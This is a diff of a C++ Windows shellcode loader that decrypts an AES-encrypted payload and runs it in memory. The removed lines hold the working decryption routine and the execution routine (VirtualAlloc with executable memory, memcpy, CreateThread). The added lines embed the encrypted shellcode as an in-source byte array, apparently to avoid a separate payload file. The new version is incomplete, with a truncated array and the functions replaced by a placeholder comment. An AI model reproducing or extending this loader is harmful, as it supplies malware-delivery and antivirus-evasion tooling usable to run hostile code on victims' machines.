@@ -1,16 +1,15 @@
-// decrypt_run.cpp
-
 #include <iostream>
-#include <fstream>
 #include <vector>
 #include <windows.h>
 #include <cryptopp/aes.h>
 #include <cryptopp/modes.h>
 #include <cryptopp/filters.h>
-#include "json.hpp"  // single header JSON parser
+#include "json.hpp"
 
-using json = nlohmann::json;
-using namespace CryptoPP;
+// Paste the output here:
+std::vector<uint8_t> encrypted_shellcode = {
+    0x4F, 0x23, 0xA7, 0x5D, 0x91, 0x10, 0xEF, 0x2C, ...
+};
 
 std::vector<uint8_t> load_key(const std::string& filename) {
     std::ifstream file(filename);
@@ -19,57 +18,16 @@ std::vector<uint8_t> load_key(const std::string& filename) {
     return j["aes_key"].get<std::vector<uint8_t>>();
 }
 
-std::vector<uint8_t> load_file(const std::string& filename) {
-    std::ifstream file(filename, std::ios::binary);
-    return std::vector<uint8_t>((std::istreambuf_iterator<char>(file)), {});
-}
-
-std::vector<uint8_t> decrypt_shellcode(const std::vector<uint8_t>& encrypted, const std::vector<uint8_t>& key) {
-    ECB_Mode<AES>::Decryption decryptor;
-    decryptor.SetKey(key.data(), key.size());
-
-    std::string decrypted;
-    CryptoPP::StringSource s(
-        encrypted.data(), encrypted.size(), true,
-        new CryptoPP::StreamTransformationFilter(decryptor, new CryptoPP::StringSink(decrypted))
-    );
-
-    // Remove padding
-    uint8_t padding_length = decrypted.back();
-    decrypted.resize(decrypted.size() - padding_length);
-
-    return std::vector<uint8_t>(decrypted.begin(), decrypted.end());
-}
-
-void execute_shellcode(const std::vector<uint8_t>& shellcode) {
-    LPVOID mem = VirtualAlloc(
-        nullptr,
-        shellcode.size(),
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
-    );
-
-    memcpy(mem, shellcode.data(), shellcode.size());
-
-    HANDLE thread = CreateThread(
-        nullptr,
-        0,
-        (LPTHREAD_START_ROUTINE)mem,
-        nullptr,
-        0,
-        nullptr
-    );
-
-    WaitForSingleObject(thread, INFINITE);
-}
+// (decryption and execution functions stay the same)
 
 int main() {
     try {
         std::vector<uint8_t> key = load_key("key.json");
-        std::vector<uint8_t> encrypted_shellcode = load_file("encrypted_shellcode.bin");
+
+        std::cout << "[+] Decrypting shellcode...\n";
         std::vector<uint8_t> shellcode = decrypt_shellcode(encrypted_shellcode, key);
 
-        std::cout << "[+] Shellcode decrypted, executing...\n";
+        std::cout << "[+] Executing shellcode...\n";
         execute_shellcode(shellcode);
     }
     catch (const std::exception& e) {
